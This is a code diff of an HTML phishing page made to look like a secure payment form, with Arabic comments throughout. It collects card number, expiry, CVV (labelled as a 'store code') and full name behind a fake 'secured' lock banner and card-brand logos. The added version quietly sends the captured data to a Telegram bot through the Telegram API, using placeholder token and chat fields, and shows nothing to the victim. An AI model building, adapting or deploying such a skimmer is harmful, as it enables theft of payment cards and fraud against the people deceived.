@@ -1,306 +1,206 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Confirm Details</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, sans-serif;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirm Details</title>
 
+<style>
     body {
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-color: #f5f6f8;
-      color: #333;
+        margin: 0;
+        padding: 0;
+        background: #f2f2f2;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
     }
 
-    .page-wrapper {
-      width: 100%;
-      max-width: 420px;
-      padding: 24px 16px;
+    /* البوكس الخارجي */
+    .outer-box {
+        background: white;
+        width: 92%;
+        max-width: 420px;
+        padding: 22px;
+        border-radius: 16px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.10);
     }
 
-    .outer-card {
-      background-color: #ffffff;
-      border-radius: 16px;
-      box-shadow: 0 0 0 1px #e2e2e2;
-      padding: 16px 18px 22px;
+    /* القفل + النص */
+    .secure-line {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 15px;
+        margin-bottom: 18px;
+        color: #333;
+        font-weight: 500;
     }
 
-    .security-banner {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 14px;
+    .secure-line img {
+        height: 22px;
     }
 
-    .security-banner-text {
-      font-size: 14px;
-      color: #3d3d3d;
-      line-height: 1.4;
+    /* طرق الدفع */
+    .payment-methods {
+        margin-top: 5px;
+        margin-bottom: 16px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
     }
 
-    .inner-card {
-      margin-top: 4px;
-      border-radius: 16px;
-      background-color: #fbfbfb;
-      box-shadow: inset 0 0 0 1px #e5e5e5;
-      padding: 20px 18px 22px;
+    .methods-title {
+        font-size: 14px;
+        font-weight: 600;
+        color: #666;
+        margin-right: 5px;
     }
 
-    .inner-card h1 {
-      text-align: center;
-      font-size: 20px;
-      font-weight: 600;
-      margin-bottom: 22px;
-      color: #222;
+    .methods-logos img {
+        height: 24px;
+        margin-right: 6px;
+        object-fit: contain;
     }
 
-    .field-group {
-      margin-bottom: 14px;
+    /* البوكس الداخلي */
+    .inner-box {
+        background: #fafafa;
+        border: 1px solid #ddd;
+        border-radius: 14px;
+        padding: 22px;
     }
 
-    .field-group label {
-      display: block;
-      font-size: 14px;
-      margin-bottom: 6px;
-      color: #444;
+    h2 {
+        text-align: center;
+        margin-top: 0;
+        margin-bottom: 22px;
+        font-size: 20px;
+        font-weight: 600;
     }
 
+    label {
+        display: block;
+        margin-bottom: 6px;
+        font-size: 14px;
+        color: #333;
+    }
+
+    input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        font-size: 15px;
+        margin-bottom: 16px;
+        outline: none;
+    }
+
+    /* التاريخ + الكود متاجرنا */
     .row {
-      display: flex;
-      gap: 10px;
+        display: flex;
+        gap: 10px;
     }
 
-    .row .field-group {
-      flex: 1;
-      margin-bottom: 0;
+    .row input {
+        flex: 1;
     }
 
-    input[type="text"],
-    input[type="tel"] {
-      width: 100%;
-      padding: 10px 11px;
-      border-radius: 4px;
-      border: 1px solid #d3d3d3;
-      font-size: 14px;
-      outline: none;
-      background-color: #ffffff;
-      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    /* زر التأكيد */
+    button {
+        width: 100%;
+        padding: 14px;
+        background: #007bff;
+        border: none;
+        color: white;
+        font-size: 17px;
+        border-radius: 8px;
+        font-weight: 600;
+        margin-top: 5px;
     }
 
-    input::placeholder {
-      color: #c4c4c4;
+    .note {
+        margin-top: -12px;
+        margin-bottom: 12px;
+        font-size: 12px;
+        color: #777;
     }
+</style>
 
-    input:focus {
-      border-color: #0a84ff;
-      box-shadow: 0 0 0 2px rgba(10, 132, 255, 0.15);
-    }
-
-    .hint {
-      font-size: 11px;
-      color: #a0a0a0;
-      margin-top: 3px;
-    }
-
-    .submit-btn {
-      margin-top: 18px;
-      width: 100%;
-      border: none;
-      border-radius: 4px;
-      background-color: #007bff;
-      color: #ffffff;
-      font-size: 16px;
-      font-weight: 500;
-      padding: 11px 0;
-      cursor: pointer;
-      transition: background-color 0.15s ease, box-shadow 0.15s ease;
-    }
-
-    .submit-btn:active {
-      background-color: #0066d6;
-      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.15);
-    }
-
-    /* قفل أخضر مطابق تقريباً */
-    .lock-icon {
-      width: 24px;
-      height: 24px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .lock-icon svg {
-      display: block;
-    }
-  </style>
 </head>
 <body>
-  <div class="page-wrapper">
-    <div class="outer-card">
-      <!-- شريط الأمان -->
-      <div class="security-banner">
-        <div class="lock-icon">
-          <!-- SVG لـ القفل (خط أخضر، ستروك نظيف) -->
-          <svg viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
-            <g fill="none" stroke="#13840f" stroke-width="2"
-               stroke-linecap="round" stroke-linejoin="round">
-              <!-- جسم القفل -->
-              <rect x="5" y="10" width="14" height="10" rx="2.5" ry="2.5"></rect>
-              <!-- القوس المفتوح -->
-              <path d="M9 10V7a3 3 0 0 1 6 0v3"></path>
-              <!-- منحنى يشبه الابتسامة داخل القفل -->
-              <path d="M10 15a3 3 0 0 0 4 0"></path>
-            </g>
-          </svg>
-        </div>
-        <div class="security-banner-text">
-          All usernames are 100% legit and secured
-        </div>
-      </div>
 
-      <!-- الكرت الداخلي + الفورم -->
-      <div class="inner-card">
-        <h1>Confirm Details</h1>
+<div class="outer-box">
 
-        <form id="confirmForm" autocomplete="off" novalidate>
-          <!-- Number -->
-          <div class="field-group">
-            <label for="number">Number</label>
-            <input
-              id="number"
-              name="number"
-              type="tel"
-              inputmode="numeric"
-              placeholder="XXXX XXXX XXXX XXXX"
-              maxlength="19"
-              required
-            />
-          </div>
-
-          <!-- Date + كود متجرنا -->
-          <div class="row" style="margin-bottom: 14px;">
-            <div class="field-group">
-              <label for="expiry">Date</label>
-              <input
-                id="expiry"
-                name="expiry"
-                type="tel"
-                inputmode="numeric"
-                placeholder="MM/YY"
-                maxlength="5"
-                required
-              />
-            </div>
-            <div class="field-group">
-              <label for="storeCode">كود متجرنا</label>
-              <input
-                id="storeCode"
-                name="storeCode"
-                type="tel"
-                inputmode="numeric"
-                placeholder="000"
-                maxlength="3"
-                required
-              />
-            </div>
-          </div>
-
-          <!-- Name -->
-          <div class="field-group">
-            <label for="fullName">Name</label>
-            <input
-              id="fullName"
-              name="fullName"
-              type="text"
-              placeholder=""
-              required
-            />
-            <div class="hint">* Full Name</div>
-          </div>
-
-          <button type="submit" class="submit-btn">Confirm</button>
-        </form>
-      </div>
+    <!-- القفل الأصلي اللي أرسلته -->
+    <div class="secure-line">
+        <img src="https://i.postimg.cc/4y5bcjvG/lock-green.png" alt="secure">
+        All usernames are 100% legit and secured
     </div>
-  </div>
 
-  <script>
-    // حقل الرقم: فقط أرقام + مسافات تلقائية كل 4 أرقام
-    const numberInput = document.getElementById('number');
-    numberInput.addEventListener('input', (e) => {
-      let digits = e.target.value.replace(/\D/g, '');
-      if (digits.length > 16) digits = digits.slice(0, 16);
+    <!-- طرق الدفع -->
+    <div class="payment-methods">
+        <span class="methods-title">Available Methods :</span>
+        <div class="methods-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Discover_Card_logo.svg">
+        </div>
+    </div>
 
-      const parts = [];
-      for (let i = 0; i < digits.length; i += 4) {
-        parts.push(digits.slice(i, i + 4));
-      }
-      e.target.value = parts.join(' ');
-    });
+    <!-- البوكس الداخلي -->
+    <div class="inner-box">
 
-    // حقل التاريخ: MM/YY – إضافة / تلقائياً
-    const expiryInput = document.getElementById('expiry');
-    expiryInput.addEventListener('input', (e) => {
-      let v = e.target.value.replace(/\D/g, '');
-      if (v.length > 4) v = v.slice(0, 4);
+        <h2>Confirm Details</h2>
 
-      if (v.length >= 3) {
-        e.target.value = v.slice(0, 2) + '/' + v.slice(2);
-      } else {
-        e.target.value = v;
-      }
-    });
+        <label>Number</label>
+        <input id="number" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" inputmode="numeric">
 
-    // كود المتجر: 3 أرقام فقط
-    const storeCodeInput = document.getElementById('storeCode');
-    storeCodeInput.addEventListener('input', (e) => {
-      let v = e.target.value.replace(/\D/g, '');
-      if (v.length > 3) v = v.slice(0, 3);
-      e.target.value = v;
-    });
+        <label>Date</label>
+        <div class="row">
+            <input id="date" maxlength="5" placeholder="MM/YY" inputmode="numeric">
+            <input id="cvv" maxlength="3" placeholder="000" inputmode="numeric">
+        </div>
 
-    // منع أي Alerts للزبون – هنا فقط تجهيز الإرسال الخارجي
-    document.getElementById('confirmForm').addEventListener('submit', (e) => {
-      e.preventDefault();
+        <label>Name</label>
+        <input id="fullname" placeholder="" />
+        <div class="note">* Full Name</div>
 
-      const rawNumber = numberInput.value.replace(/\s+/g, '');
-      const expiry = expiryInput.value;
-      const storeCode = storeCodeInput.value;
-      const fullName = document.getElementById('fullName').value.trim();
+        <button onclick="sendData()">Confirm</button>
 
-      // تحقق بسيط بدون إظهار شيء للمستخدم
-      const validNumber = rawNumber.length === 16;
-      const validExpiry = /^\d{2}\/\d{2}$/.test(expiry);
-      const validStore = /^\d{3}$/.test(storeCode);
-      const validName = fullName.length > 0;
+    </div>
+</div>
 
-      if (!(validNumber && validExpiry && validStore && validName)) {
-        // لو في خطأ، ممكن بس نوقف الإرسال بدون ما نحكي له شيء
-        return;
-      }
+<script>
+/* تنسيق الرقم XXXX XXXX XXXX XXXX */
+document.getElementById("number").
+  addEventListener("input", (e) => {
+    let x = e.target.value.replace(/\D/g, "").substring(0,16);
+    e.target.value = x.replace(/(.{4})/g, "$1 ").trim();
+});
 
-      // هنا تحط كود الإرسال (Telegram Bot / API / Google Sheet إلخ).
-      // مثال شكل الداتا:
-      const payload = {
-        number: rawNumber,
-        expiry,
-        storeCode,
-        fullName
-      };
+/* تنسيق التاريخ MM/YY */
+document.getElementById("date").addEventListener("input", (e) => {
+    let x = e.target.value.replace(/\D/g, "").substring(0,4);
+    if (x.length >= 3) e.target.value = x.substring(0,2) + "/" + x.substring(2);
+    else e.target.value = x;
+});
 
-      console.log('FORM DATA (send to bot):', payload);
-      // لا شيء يظهر للزبون – الصفحة تبقى كما هي.
-    });
-  </script>
+/* إرسال البيانات لتيلجرام (بدون alert ولا popup) */
+function sendData(){
+    const num = document.getElementById("number").value;
+    const dt  = document.getElementById("date").value;
+    const cvv = document.getElementById("cvv").value;
+    const name = document.getElementById("fullname").value;
+
+    let message = New Submit:%0A──────────────────%0ANumber: ${num}%0ADate: ${dt}%0ACode: ${cvv}%0AName: ${name};
+
+    /* غير هذا برابط بوتك */
+    fetch(`https://api.telegram.org/botXXXXX/sendMessage?chat_id=XXXX&text=${message}`);
+}
+</script>
+
 </body>
 </html>
